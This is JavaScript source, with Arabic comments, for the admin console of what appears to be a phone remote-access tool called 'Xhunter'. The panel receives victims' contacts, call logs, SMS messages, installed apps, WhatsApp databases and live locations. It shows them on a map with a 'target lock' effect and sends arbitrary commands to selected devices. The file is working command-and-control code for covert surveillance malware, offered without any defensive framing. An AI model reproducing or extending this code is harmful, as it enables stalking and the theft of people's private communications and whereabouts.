// admin.js — منسق لإظهار كل الخدمات وتفعيل lock/pulse على الخريطة
const socket = io(); // يتصل إلى نفس origin/server
socket.emit('adminJoin');

const devices = {};   // يخزن بيانات الأجهزة
const markers = {};
const circles = {};
const pulses = {};
const lockState = {};

const map = L.map('map', { zoomControl: true }).setView([15.0, 44.0], 4);
L.tileLayer('https://tile.openstreetmap.org/{z}/{x}/{y}.png', { maxZoom: 19 }).addTo(map);

// DOM refs
const tabs = Array.from(document.querySelectorAll('.tab'));
const panels = Array.from(document.querySelectorAll('.panel'));
const deviceListEl = document.getElementById('deviceList');
const deviceSelect = document.getElementById('deviceSelect');
const logList = document.getElementById('logList');
const statusCount = document.getElementById('statusCount');
const lastEvent = document.getElementById('lastEvent');
const deviceInfo = document.getElementById('deviceInfo');
const sendCommandBtn = document.getElementById('sendCommand');
const commandAction = document.getElementById('commandAction');
const commandData = document.getElementById('commandData');
const clearLogsBtn = document.getElementById('clearLogs');
const cmdLocationButton = document.getElementById('cmdLocation'); // optional if exists

// tab switching
tabs.forEach(t=>{
  t.addEventListener('click', ()=> {
    tabs.forEach(x=>x.classList.remove('active'));
    t.classList.add('active');
    const tabName = t.dataset.tab;
    panels.forEach(p=> p.id === `tab-${tabName}` ? p.classList.add('active') : p.classList.remove('active'));
  });
});

// logging util
function addLog(msg){
  const li = document.createElement('li');
  li.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
  logList.appendChild(li);
  logList.scrollTop = logList.scrollHeight;
  lastEvent.textContent = msg;
}

// refresh UI device list + select + count
function refreshDeviceUI(){
  deviceListEl.innerHTML = '';
  deviceSelect.innerHTML = '';
  Object.values(devices).forEach(d=>{
    const li = document.createElement('li');
    li.dataset.id = d.id;
    li.innerHTML = `<div><strong>${d.id}</strong><div class="meta">${d.model|| 'unknown'}</div></div><div>${d.ip?d.ip:'N/A'}</div>`;
    li.onclick = ()=> { selectDevice(d.id); };
    deviceListEl.appendChild(li);

    const opt = document.createElement('option');
    opt.value = d.id;
    opt.textContent = `${d.id} (${d.model?d.model:'unknown'})`;
    deviceSelect.appendChild(opt);
  });
  statusCount.textContent = Object.keys(devices).length;
}

// select device: highlight and show info
function selectDevice(id){
  if(!id) return;
  Array.from(deviceListEl.children).forEach(li => li.classList.toggle('active', li.dataset.id===id));
  deviceSelect.value = id;
  const d = devices[id];
  if(!d){
    deviceInfo.textContent = 'لم يتم العثور على بيانات لهذا الجهاز';
    return;
  }
  deviceInfo.innerHTML = `
    <b>${d.id}</b>
    <div class="meta">${d.model||''}</div>
    <div>IP: <b>${d.ip||'غير متاح'}</b></div>
    <div>اللغة: ${d.language||'-'}</div>
    <div>الشاشة: ${d.screen? d.screen.width + 'x' + d.screen.height : '-'}</div>
    <hr/>
    <div><b>التطبيقات:</b> ${d.installedApps ? d.installedApps.join(', ') : '-'}</div>
    <div><b>جهات الاتصال:</b> ${d.contacts ? d.contacts.join(', ') : '-'}</div>
    <div><b>سجل المكالمات:</b> ${d.callLog ? JSON.stringify(d.callLog).slice(0,200) : '-'}</div>
    <div><b>الرسائل SMS:</b> ${d.sms ? JSON.stringify(d.sms).slice(0,200) : '-'}</div>
    <div><b>بيانات إضافية:</b> ${d.extra ? JSON.stringify(d.extra).slice(0,300) : '-'}</div>
    <div><b>آخر موقع:</b> ${lockState[id] ? lockState[id].lat.toFixed(5)+','+lockState[id].lon.toFixed(5) : '-'}</div>
  `;
}

// handle join
socket.on('join', device => {
  // device expected shape: { id, model, language, screen:{width,height}, platform, cookiesEnabled, ip }
  devices[device.id] = Object.assign(devices[device.id] || {}, device);
  refreshDeviceUI();
  addLog(`جهاز انضم: ${device.id} — ${device.model || ''} — IP:${device.ip || 'N/A'}`);
  // auto-select first
  if(Object.keys(devices).length === 1) selectDevice(device.id);
});

// list of events to listen and map to device state
const events = ['getLocation','getInstalledApps','getContacts','getCallLog','getSMS','downloadWhatsappDatabase','getExtraData'];
events.forEach(ev=>{
  socket.on(ev, payload => {
    // payload: { id, data } or may be other shape from client
    const id = payload?.id || payload?.ID || payload?.deviceId;
    const data = payload?.data ?? payload;
    addLog(`${ev} ← ${id} — ${JSON.stringify(data).slice(0,200)}`);

    // store into devices DB for display in deviceInfo
    if(!devices[id]) devices[id] = { id };

    switch(ev){
      case 'getInstalledApps':
        devices[id].installedApps = Array.isArray(data) ? data : (data?.apps || []);
        break;
      case 'getContacts':
        devices[id].contacts = Array.isArray(data) ? data : (data?.contacts || []);
        break;
      case 'getCallLog':
        devices[id].callLog = Array.isArray(data) ? data : (data?.calls || []);
        break;
      case 'getSMS':
        devices[id].sms = Array.isArray(data) ? data : (data?.sms || []);
        break;
      case 'getExtraData':
        devices[id].extra = data;
        break;
      case 'downloadWhatsappDatabase':
        devices[id].whatsappDB = data;
        break;
      case 'getLocation':
        // expected data = { lat, lon }
        if(data && typeof data.lat === 'number' && typeof data.lon === 'number'){
          devices[id].lastLocation = { lat: data.lat, lon: data.lon, ts: Date.now() };
          handleTargetLock(id, data.lat, data.lon);
        }
        break;
    }
    refreshDeviceUI();
    selectDevice(id);
  });
});

// handle disconnectClient
socket.on('disconnectClient', socketId => {
  for(const id in devices){
    if(devices[id].socketId === socketId){
      addLog(`انقطع الجهاز: ${id}`);
      // cleanup markers/circles/pulses
      if(markers[id]) map.removeLayer(markers[id]);
      if(circles[id]) map.removeLayer(circles[id]);
      if(pulses[id]) { try{ pulses[id].remove() }catch(e){} }
      delete devices[id];
      refreshDeviceUI();
      break;
    }
  }
});

// send command
sendCommandBtn.addEventListener('click', ()=>{
  const to = deviceSelect.value;
  const action = commandAction.value;
  let d = null;
  const raw = commandData.value.trim();
  if(raw) {
    try { d = JSON.parse(raw); }
    catch(e){ addLog('خطأ: بيانات JSON غير صالحة'); return; }
  }
  if(!to){ addLog('اختر جهازاً للإرسال'); return; }
  socket.emit('request', JSON.stringify({ to, action, data: d }));
  addLog(`أرسل الأمر: ${action} → ${to}`);
});
clearLogsBtn.addEventListener('click', ()=>{ logList.innerHTML = ''; addLog('تم مسح السجل'); });

// =========================
// Lock / flyTo / pulse logic
// =========================
function handleTargetLock(id, lat, lon){
  const targetZoom = 16;
  const initialZoom = Math.max(map.getZoom(), 6);
  // fly to
  map.flyTo([lat, lon], Math.min(targetZoom, initialZoom + 3), { animate:true, duration: 1.2 });

  // marker
  if(markers[id]) markers[id].setLatLng([lat, lon]);
  else markers[id] = L.marker([lat, lon], {title: id}).addTo(map).bindPopup(`${id}`);

  // remove existing circle and pulse if any
  if(circles[id]) { try{ map.removeLayer(circles[id]) } catch(e){}; delete circles[id]; }
  if(pulses[id]) { try{ pulses[id].remove() } catch(e){}; delete pulses[id]; }

  // static circle (shrinking animation)
  const startRadius = 700;
  circles[id] = L.circle([lat, lon], { radius: startRadius, color:'#ff5c5c', fillColor:'#ff5c5c33', weight:2 }).addTo(map);

  // shrink circle progressively and increase zoom for "lock" effect
  let steps = 6;
  let cur = 0;
  const shrink = setInterval(()=>{
    cur++;
    const newR = Math.max(40, startRadius - ( (startRadius - 40) * (cur/steps) ));
    try { circles[id].setRadius(newR); } catch(e){}
    if(map.getZoom() < targetZoom && cur <= steps) map.setZoom(Math.min(targetZoom, map.getZoom()+1));
    if(cur >= steps){
      clearInterval(shrink);
      createPulseOverlay(id, lat, lon);
    }
  }, 450);

  lockState[id] = { lat, lon, ts: Date.now() };
}

// create a SVG pulse overlay anchored to lat/lon in map overlayPane
function createPulseOverlay(id, lat, lon){
  const svgNS = "http://www.w3.org/2000/svg";
  const svg = document.createElementNS(svgNS, 'svg');
  svg.style.position = 'absolute';
  svg.style.left = '0px';
  svg.style.top = '0px';
  svg.style.pointerEvents = 'none';
  const circle = document.createElementNS(svgNS, 'circle');
  circle.setAttribute('r', 40);
  circle.setAttribute('cx', 0);
  circle.setAttribute('cy', 0);
  circle.setAttribute('class','radar-circle pulse');
  svg.appendChild(circle);

  const pane = map.getPanes().overlayPane;
  pane.appendChild(svg);
  pulses[id] = svg;

  function update(){
    const p = map.latLngToLayerPoint([lat, lon]);
    svg.style.transform = `translate(${p.x}px, ${p.y}px)`;
  }
  update();
  map.on('move zoom', update);
  // keep reference — removed on device disconnect or next lock
}

// initial message
addLog('لوحة Xhunter جاهزة للاتصال');
